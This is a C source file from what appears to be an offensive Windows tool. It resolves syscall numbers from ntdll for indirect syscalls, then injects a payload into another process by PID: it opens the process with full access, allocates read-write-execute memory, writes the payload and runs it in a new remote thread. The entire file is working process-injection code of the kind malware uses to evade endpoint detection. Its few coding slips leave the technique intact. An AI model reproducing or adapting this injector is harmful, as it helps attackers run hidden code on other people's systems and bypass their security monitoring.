#include "headers.h"


DWORD NtOpenProcessSSN;
UINT_PTR mySyscall;

VOID Get_SSN_SYSCALL(
	IN HMODULE hNTDLL,
	IN LPCSTR NtFunction,
	OUT DWORD* SSN,
	OUT UINT_PTR* Syscall
) {

	UINT_PTR NtFunctionAddress = NULL;
	BYTE SyscallOpcode[2] = { 0x0F, 0x05 };

	info("beginning indirect prelude...");
	info("trying to get the address of %s...", NtFunction);
	NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);

	if (NtFunctionAddress == NULL) {
		warn("[GetProcAddress] failed, error: 0x%lx", GetLastError());
		return NULL;
	}

	okay("got the address of %s! (0x%p)", NtFunction, NtFunctionAddress);
	*SSN = ((PBYTE)(NtFunctionAddress + 4))[0];
	*Syscall = NtFunctionAddress + 0x12;

	if (memcmp(SyscallOpcode, *Syscall, sizeof(SyscallOpcode)) == 0) {
		okay("syscall signature (0x0F, 0x05) matched, found a valid syscall instruction!");
	}
	else {
		warn("expected syscall signature: 0x0f,0x05 didn't match.");
		return NULL;
	}

	okay("got the SSN of %s (0x%lx)", NtFunction, *SSN);
	printf("\n\t| %s ", NtFunction);
	printf("\n\t|\n\t| ADDRESS\t| 0x%p\n\t| SYSCALL\t| 0x%p\n\t| SSN\t\t| 0x%lx\n\t|____________________________________\n\n", NtFunctionAddress, *Syscall, *SSN);

}

BOOL ISysCallInject(_In_ DWORD PID, _In_ PVOID toEmbed, _In_ SIZE_T size_of_toEmbed) {
	BOOL      state = TRUE;
	PVOID     baseAddr = NULL;
	HANDLE    hThread = INVALID_HANDLE_VALUE;
	HANDLE    hProcess = INVALID_HANDLE_VALUE;
	HMODULE   hNTDLL = NULL;
	SIZE_T    numBytesWritten = 0;
	NTSTATUS  Status = 0;
	CLIENT_ID clientId = { (HANDLE)PID, 0 };
	OBJECT_ATTRIBUTES OA = { sizeof(OA),  0 };

	hNTDLL = GetModuleHandleW(L"NTDLL");
	if (hNTDLL == NULL) {
		warn("Failed to get a handle to module ntdll.dll error: [0x%ld]", GetLastError());
		return FALSE;
	}
	info("Got a handle to module NTDLL (0x%p)", hNTDLL);
	Get_SSN_SYSCALL(hNTDLL, "NtOpenProcess", &NtOpenProcessSSN, &mySyscall);
	printf("\nTrying to open a handle to process with PID: %ld\n", PID);
	//Opening a handle to the process using the provided PID
	Status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &clientId);
	if (Status != STATUS_SUCCESS) {
		warn("Failed to get a handle to process with PID %ld NTSTATUS code 0x%X\n", PID, Status);
		return FALSE;
	}
	okay("Got a handle to the process! NTSTATUS code: 0x%X\n", Status);

	//allocate memory needed to prepare the spaceB before writing the data in
	Status = NtAllocateVirtualMemory(hProcess, &baseAddr, 0, &size_of_toEmbed, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (Status != STATUS_SUCCESS) {
		warn("Failed to allocate virtual memory NTSTATUS code 0x%X\n", Status);
		state = FALSE; goto CLEANUP;
	}
	okay("%zu-bytes was allocated with PAGE_EXECUTE_READWRITE permissions! NTSTATUS: 0x%X", size_of_toEmbed, Status);

	//write allocated memory to the process memory
	Status = NtWriteVirtualMemory(hProcess, baseAddr, toEmbed, size_of_toEmbed, &numBytesWritten);
	if (Status != STATUS_SUCCESS) {
		warn("Failed to write buffer to memory NTSTATUS code 0x%X\n", Status);
		state = FALSE; goto CLEANUP;
	}
	okay("Wrote %zu-bytes to process memory! NTSTATUS: 0x%X", size_of_toEmbed, Status);

	//Create thread to run allocated payload
	Status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, baseAddr, NULL, FALSE, 0, 0, 0, NULL);
	if (Status != STATUS_SUCCESS) {
		warn("Failed to get a handle to the thread, NTSTATUS: 0x%X", Status);
		state = FALSE; goto CLEANUP;
	}
	okay("Got a handle to the Thread! NTSTATUS: 0x%X\n\\---0x%p\n", Status, hThread);

	info("Payload Executing...\n");
	Status = NtWaitForSingleObject(hThread, FALSE, NULL);
	if (Status != STATUS_SUCCESS) {
		warn("Wait for OBJ func failed.");
		state = FALSE; goto CLEANUP;
	}
	info("Payload Finished executing\n");

CLEANUP:
	info("Cleaning Up :)\n");
	if (hProcess) {
		info("closing handle to process...");
		Status = NtClose(hProcess);
		if (!Status == STATUS_SUCCESS) {
			warn("[NtClose] failed to close handle, error: 0x%x", Status);
			return FALSE;
		}
		okay("closed!");
	}

	if (hThread) {
		info("closing handle to thread...");
		Status = NtClose(hThread);
		if (!Status == STATUS_SUCCESS) {
			warn("[NtClose] failed to close handle, error: 0x%x", Status);
			return FALSE;
		}
		okay("closed!");
	}
	if (hNTDLL) {
		info("[0x%p] handle on NTDLL closed", hNTDLL);
		NtClose(hNTDLL);
	}
	return state;
}